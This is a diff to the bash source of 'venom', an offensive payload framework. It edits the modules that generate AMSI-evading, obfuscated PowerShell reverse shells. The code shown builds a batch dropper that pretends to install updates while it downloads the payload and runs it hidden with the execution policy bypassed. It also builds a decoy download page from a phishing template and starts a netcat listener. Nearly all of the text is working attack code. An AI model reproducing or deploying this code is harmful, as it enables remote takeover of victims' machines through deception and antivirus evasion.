@@ -11410,7 +11410,7 @@ echo "[☠] Enter module settings!"
 lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
@@ -12005,11 +12005,12 @@ if [ -z "$Drop" ]; then Drop="dropper";fi
 if [ -z "$NaM" ]; then NaM="revshell";fi
 
 # display final settings to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
+    UPLOAD   : FileLess (ram)
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
@@ -12023,8 +12024,7 @@ echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','htt
 
 
 ## Build Reverse Powershell Shell
-echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
-sleep 2
+echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
@@ -12054,7 +12054,7 @@ echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 
 
-## Building Phishing webpage
+## Building Download webpage
 cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
@@ -12087,7 +12087,7 @@ sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
@@ -12105,7 +12105,6 @@ sh_menu
 # --------------------------------------------------
 sh_evasion2 () {
 Colors;
-
 
 ## Make sure openssl dependencie its installed
 imp=$(which openssl)
@@ -12139,11 +12138,12 @@ if [ -z "$NaM" ]; then NaM="revshell";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 
 # display final settings to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
+    UPLOAD   : FileLess (ram)
     LOLBin   : WinHttpRequest
     CN NAME  : $CN
     DROPPER  : $IPATH/output/$Drop.ps1
@@ -12158,8 +12158,7 @@ echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','htt
 
 
 ## Build Reverse Powershell Shell
-echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
-sleep 2
+echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output .."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
@@ -12198,7 +12197,7 @@ echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${
 cd $IPATH
 
 
-## Building Phishing webpage
+## Building Download webpage
 cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
@@ -12233,7 +12232,7 @@ sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
@@ -12265,22 +12264,25 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Obfrevshell\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="install";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="Obfrevshell";fi
 
 # display final settings to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : WinHttpRequest
+    UPLOAD   : $rpath
+    LOLBin   : Powershell (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
 !
@@ -12288,16 +12290,14 @@ echo "---"
 
 
 ## BUILD DROPPER
-echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-#echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
-
+# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
+echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 echo "@echo off" > $IPATH/output/$Drop.bat
 echo "echo Please Wait, Installing Updates .." >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '%tmp%\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"%tmp%\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
-echo "echo Done Installing, Closing Terminal .. && timeout /t 3 > NUL" >> $IPATH/output/$Drop.bat
+echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
 
-## Convert ip addr to hex
+## Convert attacker ip address to hex
 echo "${BlueF}[☠]${white} Converting ip address to hex ..${white}";sleep 2
 one=$(echo $lhost|cut -d '.' -f1)
 two=$(echo $lhost|cut -d '.' -f2)
@@ -12313,6 +12313,7 @@ echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed ${white}";s
 
 
 ## Build Reverse Powershell Shell (obfuscated)
+echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
@@ -12322,7 +12323,7 @@ echo "" >> $IPATH/output/$NaM.ps1
 echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 5}" >> $IPATH/output/$NaM.ps1
 
 
-## Building Phishing webpage
+## Building Download webpage
 cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
@@ -12333,7 +12334,7 @@ cd $IPATH
 ## Copy files to apache2 webroot
 cd $IPATH/output
 zip $Drop.zip $Drop.bat > /dev/nul 2>&1
-#zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+#zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
@@ -12351,13 +12352,13 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " NETCAT LISTENER- $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
 cd $IPATH
 sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
@@ -12371,7 +12372,7 @@ sh_menu
 
 
 
-
+# NOT IN USE
 sh_evasion4 () {
 Colors;
 
